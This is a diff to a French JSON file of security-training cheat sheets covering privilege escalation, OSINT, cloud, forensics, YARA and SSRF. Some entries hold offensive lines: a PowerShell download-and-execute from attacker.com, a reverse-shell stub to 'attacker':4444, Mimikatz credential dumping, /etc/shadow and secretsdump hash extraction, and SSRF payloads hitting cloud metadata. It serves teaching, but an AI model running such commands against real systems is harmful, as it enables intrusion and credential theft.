@@ -6,7 +6,7 @@
     "niveau": "Avancé",
     "contenu": "# Privilege Escalation Linux\n\n## 1. Information Gathering\nuname -a\nid\nsudo -l\ncat /etc/sudoers\nfind / -perm -4000 -ls 2>/dev/null\n\n## 2. SUID Binaries\nfind / -type f -perm -u=s 2>/dev/null\nstrings /usr/bin/something\nstrace -e trace=execve /usr/bin/something\n\n## 3. Kernel Exploits\nuname -r\ncat /proc/version\n\n## 4. Sudo Exploitation\nsudo -l\nsudo -u user command\n\n## 5. NOPASSWD Exploitation\ngrep -r NOPASSWD /etc/sudoers\n\n## 6. Path Exploitation\necho $PATH\nls -la /usr/local/bin\n\n## 7. Weak File Permissions\nfind / -type f -perm 0777 2>/dev/null\nfind / -type d -perm 0777 2>/dev/null\n\n## 8. Cron Jobs\ncat /etc/crontab\nls -la /etc/cron.d/\nls -la /etc/cron.daily/",
     "commandes": ["sudo", "find", "chmod", "cat", "strings", "strace"],
-    "ressources": "https://github.com/swisskyrepo/PayloadsAllTheThings"
+    "ressources": "https://gtfobins.github.io/"
   },
   {
     "titre": "Web Penetration Testing",
@@ -33,7 +33,7 @@
     "niveau": "Avancé",
     "contenu": "# Windows Privilege Escalation\n\n## Information Gathering\nwhoami\nwhoami /priv\nwhoami /groups\nsysteminfo\nipconfig /all\n\n## Unquoted Service Paths\nwmic service list brief\nGet-WmiObject win32_service\n\n## Weak Folder Permissions\nicacls C:\\Program Files\\*\n\n## Registry Modification\nreg query HKLM\\System\nreg add HKCU\\Software\\Microsoft\\Windows\\Run\n\n## UAC Bypass\nBypassUAC.exe\n\n## Token Impersonation\nIncognito.exe list_tokens -u\n\n## Scheduled Tasks\ntasklist /V\ntasksched.msc\nschtasks /query /fo LIST /v\n\n## Kernel Exploits\nwmic os get version\nwmic os get buildnumber",
     "commandes": ["whoami", "systeminfo", "icacls", "reg", "wmic", "tasklist"],
-    "ressources": "https://github.com/swisskyrepo/PayloadsAllTheThings"
+    "ressources": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"
   },
   {
     "titre": "Network Reconnaissance",
@@ -128,16 +128,16 @@
   {
     "titre": "Reverse Engineering Tools",
     "description": "Outils et techniques de reverse engineering",
-    "categorie": "Linux",
+    "categorie": "Reverse Engineering",
     "niveau": "Avancé",
-    "contenu": "# Reverse Engineering\n\n## Static Analysis\nfile binary\nstrings binary\nobjdump -d binary\nobjdump -M intel -d binary\nreadelf -a binary\nnm binary\n\n## Dynamic Analysis\nstrace ./binary\nltrace ./binary\ngdb ./binary\n\n## Ghidra\nghidraRun\nFile > Import File\nAnalyze\nWindow > Decompile\n\n## Radare2\nr2 binary\naaa\nafl\npdf @ main\nVV @ main\n\n## IDA Pro\nFile > Open\nView > Open Subviews > Functions\nF5 (decompile)\n\n## Debugging\nbreakpoint\nstep\nnext\ncontinue\nprint variable\n\n## Patching\npr2 binary\ns main\nwao nop\nwt patched\n\n## Unpacking\nupx -d packed.exe",
+    "contenu": "# Reverse Engineering\n\n## Static Analysis\nfile binary\nstrings binary\nobjdump -d binary\nobjdump -M intel -d binary\nreadelf -a binary\nnm binary\n\n## Dynamic Analysis\nstrace ./binary\nltrace ./binary\ngdb ./binary\n\n## Ghidra\nghidraRun\nFile > Import File\nAnalyze\nWindow > Decompile\n\n## Radare2\nr2 binary\naaa\nafl\npdf @ main\nVV @ main\n\n## IDA Pro\nFile > Open\nView > Open Subviews > Functions\nF5 (decompile)\n\n## Debugging\nbreakpoint\nstep\nnext\ncontinue\nprint variable\n\n## Patching\nr2 -w binary\ns main\nwao nop\nwt patched\n\n## Unpacking\nupx -d packed.exe",
     "commandes": ["ghidra", "radare2", "ida", "gdb", "objdump", "strings"],
     "ressources": "https://ghidra-sre.org/"
   },
   {
     "titre": "OSINT Techniques",
     "description": "Open Source Intelligence gathering",
-    "categorie": "Réseau",
+    "categorie": "OSINT",
     "niveau": "Débutant",
     "contenu": "# OSINT Techniques\n\n## Search Engines\nsite:target.com\nfiletype:pdf site:target.com\nintitle:\"index of\" site:target.com\ninurl:admin site:target.com\n\n## Subdomain Enumeration\nsublist3r -d target.com\namass enum -d target.com\nsubfinder -d target.com\n\n## Email Harvesting\ntheHarvester -d target.com -b google\nhunter.io\n\n## Social Media\nsherlock username\nmaigret username\n\n## DNS Information\nwhois target.com\ndig target.com ANY\nnslookup target.com\n\n## IP Information\niplocation.net\nshodan.io\ncensys.io\n\n## Metadata Extraction\nexiftool document.pdf\nmetagoofil -d target.com -t pdf\n\n## Archive Search\narchive.org/web/\nwaybackmachine",
     "commandes": ["theHarvester", "sublist3r", "amass", "sherlock", "exiftool"],
@@ -146,7 +146,7 @@
   {
     "titre": "Cryptography Basics",
     "description": "Concepts de base en cryptographie",
-    "categorie": "Scripting",
+    "categorie": "Crypto",
     "niveau": "Intermédiaire",
     "contenu": "# Cryptography\n\n## Hashing\necho -n \"password\" | md5sum\necho -n \"password\" | sha256sum\necho -n \"password\" | sha512sum\n\n## Symmetric Encryption\nopenssl enc -aes-256-cbc -in file.txt -out encrypted.bin\nopenssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt\n\n## Asymmetric Encryption\nopenssl genrsa -out private.pem 2048\nopenssl rsa -in private.pem -outform PEM -pubout -out public.pem\n\n## Base64\necho \"data\" | base64\necho \"ZGF0YQ==\" | base64 -d\n\n## ROT13\necho \"hello\" | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n\n## Certificate\nopenssl req -new -x509 -days 365 -keyout server.key -out server.crt\nopenssl x509 -in certificate.crt -text -noout\n\n## Password Cracking\njohn --wordlist=rockyou.txt hashes.txt\nhashcat -m 0 hashes.txt wordlist.txt\n\n## Random Data\nopenssl rand -base64 32",
     "commandes": ["openssl", "john", "hashcat", "gpg"],
@@ -164,7 +164,7 @@
   {
     "titre": "AWS Security",
     "description": "Sécurité AWS et pentesting cloud",
-    "categorie": "Réseau",
+    "categorie": "Cloud",
     "niveau": "Avancé",
     "contenu": "# AWS Security\n\n## Enumeration\naws sts get-caller-identity\naws iam list-users\naws iam list-roles\naws s3 ls\naws ec2 describe-instances\n\n## S3 Buckets\naws s3 ls s3://bucket-name\naws s3 cp s3://bucket-name/file .\naws s3 sync s3://bucket-name .\naws s3 mb s3://new-bucket\n\n## IAM\naws iam get-user\naws iam list-attached-user-policies --user-name user\n\n## EC2\naws ec2 describe-instances\naws ec2 describe-security-groups\naws ec2 describe-snapshots\n\n## Lambda\naws lambda list-functions\naws lambda get-function --function-name name\n\n## Secrets Manager\naws secretsmanager list-secrets\naws secretsmanager get-secret-value --secret-id name\n\n## CloudTrail\naws cloudtrail lookup-events\n\n## Escalation\naws iam create-access-key --user-name admin",
     "commandes": ["awscli", "pacu", "cloudfox", "prowler"],
@@ -187,5 +187,104 @@
     "contenu": "# PowerShell for Pentesting\n\n## Basic\nGet-Command\nGet-Help command\nGet-Process\nGet-Service\nGet-NetIPAddress\n\n## Files\nGet-ChildItem -Path C:\\ -Recurse\nGet-Content file.txt\nSet-Content file.txt \"data\"\nCopy-Item source dest\nRemove-Item file.txt\n\n## Network\nTest-NetConnection target -Port 80\nInvoke-WebRequest http://target.com\nResolve-DnsName target.com\n\n## Download & Execute\nIEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')\n\n## PowerView\nImport-Module PowerView.ps1\nGet-NetDomain\nGet-NetUser\n\n## Mimikatz\nInvoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'\n\n## Reverse Shell\n$client = New-Object System.Net.Sockets.TCPClient('attacker',4444)\n$stream = $client.GetStream()\n\n## Bypass\npowershell -ExecutionPolicy Bypass -File script.ps1",
     "commandes": ["powershell", "PowerView", "PowerUp", "Invoke-Mimikatz"],
     "ressources": "https://docs.microsoft.com/en-us/powershell/"
+  },
+    {
+    "titre": "Password Cracking",
+    "description": "Guide des outils et techniques de cassage de mots de passe.",
+    "categorie": "Cracking",
+    "niveau": "Intermédiaire",
+    "contenu": "# Password Cracking\n\n## 1. Hash Identification\nhash-identifier HASH\nhashid HASH\n\n## 2. John the Ripper\nunshadow /etc/passwd /etc/shadow > hashes.txt\njohn --wordlist=rockyou.txt hashes.txt\njohn --show hashes.txt\n\n## 3. Hashcat\nhashcat -m <hash_mode> -a 0 hash.txt wordlist.txt  # Straight\nhashcat -m <hash_mode> -a 3 hash.txt ?l?l?l?l?l?l?l?l # Mask Attack\nhashcat -m 1000 hash.txt rockyou.txt -r rules/best64.rule # Rule-based\n\n## 4. Common Hash Modes (Hashcat)\n0    - MD5\n100  - SHA1\n1000 - NTLM\n1800 - SHA-512 (Unix)\n3200 - bcrypt\n22000 - WPA-PBKDF2-PMKID+EAPOL\n\n## 5. Getting Hashes\ncat /etc/shadow\nlsadump::sam (mimikatz)\nimpacket-secretsdump",
+    "commandes": ["john", "hashcat", "hashid", "unshadow", "mimikatz"],
+    "ressources": "https://hashcat.net/wiki/"
+  },
+  {
+    "titre": "Nmap Scripting Engine (NSE)",
+    "description": "Utilisation avancée de Nmap avec le NSE pour la détection de vulnérabilités.",
+    "categorie": "Réseau",
+    "niveau": "Intermédiaire",
+    "contenu": "# Nmap Scripting Engine (NSE)\n\n## 1. Basic Scripts\n# Utiliser les scripts par défaut\nnmap -sC target\nnmap --script=default target\n\n## 2. Script Categories\n# Utiliser des scripts d'une catégorie spécifique\nnmap --script=vuln target.\nnmap --script \"http-*\" target\n# Catégories: auth, broadcast, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln\n\n## 3. Specific Scripts\n# Lancer un script spécifique\nnmap --script=http-title target\nnmap --script=smb-enum-shares.nse target\n\n## 4. Script Arguments\n# Fournir des arguments à un script\nnmap --script http-brute --script-args userdb=users.txt,passdb=pass.txt target\n\n## 5. Finding Scripts\nls -l /usr/share/nmap/scripts/*.nse\n\n## 6. Updating Script Database\nnmap --script-updatedb.",
+    "commandes": ["nmap"],
+    "ressources": "https://nmap.org/book/nse.html"
+  },
+  {
+    "titre": "Digital Forensics Basics",
+    "description": "Commandes et outils de base pour l'investigation numérique.",
+    "categorie": "Forensics",
+    "niveau": "Intermédiaire",
+    "contenu": "# Digital Forensics Basics\n\n## 1. Disk Imaging\n# Créer une image disque bit-à-bit\ndd if=/dev/sda of=image.dd bs=4M\n# Utiliser dc3dd pour le hachage en temps réel\ndc3dd if=/dev/sda of=image.dd hash=md5 log=image.log\n\n## 2. Memory Forensics (Volatility)\n# Identifier le profil de l'image mémoire\nvolatility -f mem.raw imageinfo\n# Lister les processus\nvolatility -f mem.raw --profile=Win7SP1x64 pslist\n# Extraire les connexions réseau\nvolatility -f mem.raw --profile=Win7SP1x64 netscan\n\n## 3. Filesystem Analysis (The Sleuth Kit)\n# Lister les partitions\nmmls image.dd\n# Lister les fichiers d'une partition\nfls -o OFFSET image.dd\n\n## 4. File Carving\n# Récupérer des fichiers supprimés\nphotorec image.dd\n\n## 5. String Extraction\n# Extraire les chaînes de caractères lisibles\nstrings -n 8 image.dd > strings.txt",
+    "commandes": ["dd", "dc3dd", "volatility", "photorec", "strings", "mmls", "fls"],
+    "ressources": "https://www.volatilityfoundation.org/"
+  },
+    {
+    "titre": "MITRE ATT&CK Framework",
+    "description": "Guide de référence pour le framework MITRE ATT&CK.",
+    "categorie": "Red Team",
+    "niveau": "Intermédiaire",
+    "contenu": "# MITRE ATT&CK Framework\n\n## Comprendre la Matrice\nLe framework ATT&CK est une base de connaissances des tactiques et techniques adverses basées sur des observations du monde réel.\n\n## Tactiques (Les objectifs de l'attaquant)\n- **Reconnaissance** (TA0043)\n- **Développement de ressources** (TA0042)\n- **Accès Initial** (TA0001)\n- **Exécution** (TA0002)\n- **Persistance** (TA0003)\n- **Élévation de privilèges** (TA0004)\n- **Évasion de défense** (TA0005)\n- **Accès aux informations d'identification** (TA0006)\n- **Découverte** (TA0007)\n- **Mouvement latéral** (TA0008)\n- **Collecte** (TA0009)\n- **Commande et Contrôle** (TA0011)\n- **Exfiltration** (TA0010)\n- **Impact** (TA0040)\n\n## Exemples de Techniques\n- **T1566: Phishing** (Accès Initial)\n- **T1059: Interpréteur de commandes et de scripts** (Exécution)\n- **T1078: Comptes valides** (Évasion de défense, Persistance, etc.)\n- **T1055: Injection de processus** (Évasion de défense, Élévation de privilèges)\n\n## Utilisation\n- Modélisation des menaces\n- Évaluation de la sécurité\n- Simulation d'adversaires (Red Teaming)\n- Détection et investigation (Blue Teaming)",
+    "commandes": ["ATT&CK Navigator"],
+    "ressources": "https://attack.mitre.org/"
+  },
+  {
+    "titre": "Kubernetes Security",
+    "description": "Points de contrôle de sécurité pour les clusters Kubernetes.",
+    "categorie": "Cloud",
+    "niveau": "Avancé",
+    "contenu": "# Kubernetes Security\n\n## 1. Énumération du Cluster\nkubectl get pods,services,deployments --all-namespaces\nkubectl cluster-info\nkubectl get secrets\n\n## 2. Pod Security\n# Chercher des pods privilégiés\nkubectl get pods --all-namespaces -o jsonpath='{.items[?(@.spec.containers[*].securityContext.privileged==true)].metadata.name}'\n# Ne pas monter le socket Docker\n# Utiliser des contextes de sécurité (Security Contexts)\n\n## 3. RBAC (Role-Based Access Control)\n# Lister les rôles et cluster roles\nkubectl get roles,clusterroles --all-namespaces\n# Vérifier les permissions d'un utilisateur\nkubectl auth can-i <verb> <resource> --as <user>\n\n## 4. Sécurité Réseau\n# Utiliser des Network Policies pour segmenter le trafic\n# Ne pas exposer de services sur un NodePort ou LoadBalancer public inutilement\n\n## 5. Outils de Sécurité\n# Scanner les manifestes YAML\nkube-score\n# Audit de la configuration du cluster\nkube-bench\n# Détection d'anomalies à l'exécution\nFalco, Trivy\n\n## 6. Attaques Connues\n# Pod d'échappement (Escape)\n# Attaque du service de métadonnées du cloud\n# Exploitation de l'API Server",
+    "commandes": ["kubectl", "kube-bench", "kube-score", "falco", "trivy"],
+    "ressources": "https://kubernetes.io/docs/concepts/security/"
+  },
+  {
+    "titre": "Android Pentesting",
+    "description": "Bases du test de pénétration d'applications Android.",
+    "categorie": "Mobile",
+    "niveau": "Intermédiaire",
+    "contenu": "# Android Pentesting\n\n## 1. Configuration de l'environnement\n# Android Debug Bridge (ADB)\nadb devices\nadb shell\nadb push <local> <remote>\nadb pull <remote> <local>\nadb logcat\n\n## 2. Analyse Statique\n# Décompiler l'APK\napktool d app.apk\n# Convertir DEX en JAR\nd2j-dex2jar app.apk\n# Visualiser le code Java\njadx-gui app.apk\n# Chercher des secrets\ngrep -rE 'api_key|password|secret' ./app\n\n## 3. Analyse Dynamique\n# Interception du trafic\nConfigurer Burp Suite avec l'émulateur/appareil\n# Analyse à l'exécution avec Frida\nfrida-ps -U\nfrida -U -f com.package.name -l script.js\n# Accéder aux données de l'application\nadb shell 'run-as com.package.name ls -l /data/data/com.package.name/'\n\n## 4. Vulnérabilités Communes\n- Stockage de données non sécurisé (Shared Preferences, SQLite)\n- Communication réseau non chiffrée (HTTP)\n- Hardcoding de secrets\n- Mauvaise implémentation du SSL Pinning\n- Exposition de composants (Activities, Services, Broadcast Receivers)",
+    "commandes": ["adb", "apktool", "dex2jar", "jadx-gui", "frida", "burpsuite"],
+    "ressources": "https://owasp.org/www-project-mobile-security-testing-guide/"
+  },
+  {
+    "titre": "Wireshark Display Filters",
+    "description": "Filtres d'affichage utiles pour l'analyse de trafic avec Wireshark.",
+    "categorie": "Réseau",
+    "niveau": "Débutant",
+    "contenu": "# Wireshark Display Filters\n\n## Filtrage par IP\nip.addr == 192.168.1.1\nip.src == 192.168.1.100\nip.dst != 192.168.1.254\n\n## Filtrage par Port\ntcp.port == 443\nudp.port == 53\ntcp.dstport == 80\n\n## Filtrage par Protocole\nhttp\ndns\narp\nicmp\n\n## Combinaison de Filtres (Logique)\n# ET\nip.addr == 192.168.1.1 && tcp.port == 80\n# OU\nhttp || dns\n# NON\n!arp\n\n## Filtres HTTP\nhttp.request.method == \"GET\"\nhttp.response.code == 404\nhttp.host contains \"example.com\"\n\n## Filtres TCP\n# Paquets avec le flag SYN\ntcp.flags.syn == 1 && tcp.flags.ack == 0\n# Paquets RST\ntcp.flags.reset == 1\n# Conversations\ntcp.stream eq 0\n\n## Autres\n# Contient une chaîne de caractères (lent)\nframe contains \"password\"",
+    "commandes": ["wireshark", "tshark"],
+    "ressources": "https://www.wireshark.org/docs/dfref/"
+  },
+  {
+    "titre": "Iptables Firewall",
+    "description": "Gestion du pare-feu Netfilter sous Linux avec iptables.",
+    "categorie": "Blue Team",
+    "niveau": "Intermédiaire",
+    "contenu": "# Iptables Firewall\n\n## Chaînes (Chains)\n- **INPUT**: Paquets destinés au pare-feu lui-même.\n- **FORWARD**: Paquets routés à travers le pare-feu.\n- **OUTPUT**: Paquets générés par le pare-feu.\n\n## Commandes de base\n# Lister les règles\niptables -L -v -n\n# Supprimer toutes les règles (Flush)\niptables -F\n# Mettre les politiques par défaut à DROP\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT ACCEPT\n\n## Exemples de Règles\n# Autoriser le trafic déjà établi\niptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT\n# Autoriser le loopback\niptables -A INPUT -i lo -j ACCEPT\n# Autoriser le SSH entrant\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\n# Autoriser le HTTP/HTTPS sortant\niptables -A OUTPUT -p tcp --dport 80 -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -j ACCEPT\n# Bloquer une IP spécifique\niptables -A INPUT -s 1.2.3.4 -j DROP\n\n## Sauvegarder les règles\n# Debian/Ubuntu\niptables-save > /etc/iptables/rules.v4\n# RHEL/CentOS\nservice iptables save",
+    "commandes": ["iptables", "iptables-save", "iptables-restore"],
+    "ressources": "https://www.netfilter.org/documentation/"
+  },
+  {
+    "titre": "Windows Event Log Analysis",
+    "description": "Analyse des journaux d'événements Windows pour l'investigation.",
+    "categorie": "Forensics",
+    "niveau": "Intermédiaire",
+    "contenu": "# Windows Event Log Analysis\n\n## Emplacements des Logs\n`%SystemRoot%\\System32\\Winevt\\Logs\\`\n- **Security.evtx**: Événements de sécurité (logons, etc.)\n- **System.evtx**: Événements système\n- **Application.evtx**: Événements des applications\n\n## Event IDs Clés de Sécurité\n- **4624**: Connexion réussie (Logon Type 3 = réseau, 2 = interactif)\n- **4625**: Échec de connexion\n- **4634**: Déconnexion\n- **4648**: Tentative de connexion avec des identifiants explicites (runas)\n- **4720**: Création d'un compte utilisateur\n- **4776**: Tentative d'authentification NTLM\n- **1102**: Le journal d'audit a été effacé\n\n## Outils en Ligne de Commande\n# PowerShell\nGet-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | Format-List\n# Wevtutil\nwevtutil qe Security /q:\"*[System[(EventID=4625)]]\" /c:5 /rd:true /f:text\n\n## Outils Graphiques\n- **Event Viewer (eventvwr.msc)**: L'outil natif de Windows.\n- **Timeline Explorer**: Pour visualiser les événements de manière chronologique.\n- **Chainsaw**: Outil de recherche et d'extraction rapide.\n\n## Conseils d'Analyse\n- Rechercher les effacements de logs (Event ID 1102).\n- Corréler les heures de connexion (4624) avec les actions suspectes.\n- Surveiller les échecs de connexion en masse (4625) pour détecter les attaques par force brute.",
+    "commandes": ["eventvwr.msc", "Get-WinEvent", "wevtutil", "chainsaw"],
+    "ressources": "https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/"
+  },
+  {
+    "titre": "YARA Rules",
+    "description": "Écriture de règles YARA pour l'identification de malwares.",
+    "categorie": "Malware Analysis",
+    "niveau": "Intermédiaire",
+    "contenu": "# YARA Rules\n\n## Structure d'une Règle\nrule ExampleRule\n{\n    meta:\n        author = \"Your Name\"\n        description = \"Detects a specific malware family\"\n    strings:\n        $text_string = \"malicious_string\"\n        $hex_string = { E2 34 A1 C8 23 FB }\n        $regex = /evil_regex/is\n    condition:\n        $text_string or $hex_string or $regex\n}\n\n## Syntaxe\n- **meta**: Métadonnées sur la règle (auteur, date, etc.)\n- **strings**: Chaînes de caractères, hexadécimales ou regex à rechercher.\n- **condition**: Logique qui détermine si la règle correspond.\n\n## Conditions Complexes\n# Nombre d'occurrences\n#text_string > 5\n# Taille du fichier\nfilesize > 10KB\n# Combinaison de chaînes\n$text_string and ($hex_string or $regex)\n# Chaîne à un offset spécifique\n$hex_string at 0\n\n## Exécution de YARA\n# Appliquer une règle à un fichier\nyara rule.yar file_to_scan.exe\n# Appliquer des règles à un répertoire (récursif)\nyara -r rules_dir/ target_dir/\n\n## Bonnes Pratiques\n- Éviter les chaînes trop communes pour réduire les faux positifs.\n- Utiliser une combinaison de plusieurs indicateurs (strings, imports, etc.).\n- Rédiger des métadonnées claires.",
+    "commandes": ["yara"],
+    "ressources": "https://yara.readthedocs.io/"
+  },
+  {
+    "titre": "Server-Side Request Forgery (SSRF)",
+    "description": "Techniques d'exploitation et de prévention des SSRF.",
+    "categorie": "Web",
+    "niveau": "Avancé",
+    "contenu": "# Server-Side Request Forgery (SSRF)\n\n## Définition\nUne SSRF se produit lorsqu'un attaquant peut forcer une application côté serveur à effectuer des requêtes HTTP vers un domaine choisi par l'attaquant.\n\n## Vecteurs d'Attaque Communs\n- `?url=http://attaquant.com`\n- `?path=/etc/passwd` (via le wrapper `file://`)\n- `?host=127.0.0.1&port=80`\n\n## Exploitation\n### 1. Scan de ports internes\n`http://vulnerable.com/proxy?url=127.0.0.1:22`\n`http://vulnerable.com/proxy?url=192.168.0.1:8080`\n\n### 2. Accès aux services de métadonnées Cloud\n# AWS (IMDSv1)\n`http://vulnerable.com/proxy?url=http://169.254.169.254/latest/meta-data/`\n# Google Cloud\n`http://vulnerable.com/proxy?url=http://metadata.google.internal/computeMetadata/v1/ -H \"Metadata-Flavor: Google\"`\n\n### 3. Lecture de fichiers locaux\n`http://vulnerable.com/proxy?url=file:///etc/passwd`\n`http://vulnerable.com/proxy?url=file:///C:/Windows/win.ini`\n\n## Techniques de Contournement (Bypass)\n- **Utilisation d'IPv6**: `[::]` au lieu de `127.0.0.1`\n- **Encodage**: `127.0.0.1` -> `2130706433` (décimal) ou `0x7f000001` (hex)\n- **Redirections**: Utiliser un domaine qui redirige vers une IP interne.\n- **Wildcard DNS**: Utiliser un sous-domaine qui résout vers `127.0.0.1`.\n\n## Prévention\n- Valider les URLs en liste blanche (whitelist).\n- Ne pas suivre les redirections.\n- Désactiver les schémas non-HTTP (comme `file://`, `gopher://`).\n- Utiliser un proxy réseau pour les requêtes sortantes.",
+    "commandes": ["curl", "burpsuite", "ssrfmap"],
+    "ressources": "https://portswigger.net/web-security/ssrf"
   }
 ]
